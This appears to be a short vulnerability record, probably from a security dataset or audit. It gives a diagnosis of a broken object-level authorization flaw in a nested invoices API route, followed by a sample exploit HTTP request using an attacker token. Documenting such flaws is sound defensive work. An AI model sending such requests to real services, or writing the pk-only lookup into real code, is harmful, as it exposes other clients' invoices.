diagnosis: In a nested route structure (/api/clients/{client_id}/invoices/{pk}/), the view retrieves the invoice solely using pk=pk without verifying that the invoice belongs to the specified client_id or that the requesting user's firm manages that client.
exploit_request:
GET /api/clients/12/invoices/9954/ HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
